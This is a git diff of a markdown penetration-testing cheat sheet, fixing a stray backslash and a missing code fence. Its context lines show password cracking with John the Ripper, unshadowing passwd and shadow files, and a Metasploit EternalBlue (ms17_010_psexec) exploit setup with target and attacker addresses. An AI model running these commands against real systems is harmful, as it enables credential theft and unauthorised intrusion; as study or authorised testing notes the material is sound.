@@ -47,7 +47,7 @@ netstat -tlunp      #linux
 ## John
 ```sh
 john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5
-unshadow passwd shadow > unshadowed.txt\
+unshadow passwd shadow > unshadowed.txt
 john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
 ```
 ## Dirbuster
@@ -214,6 +214,7 @@ set session
 exploit(windows/smb/ms17_010_psexec)> set RHOST </Target-IP\>
 exploit(windows/smb/ms17_010_psexec)> set LHOST </Attacker-IP\>
 exploit(windows/smb/ms17_010_psexec)> run 
+```
 **After PrivEsc**
 ```sh
 migrate \<pid\>   
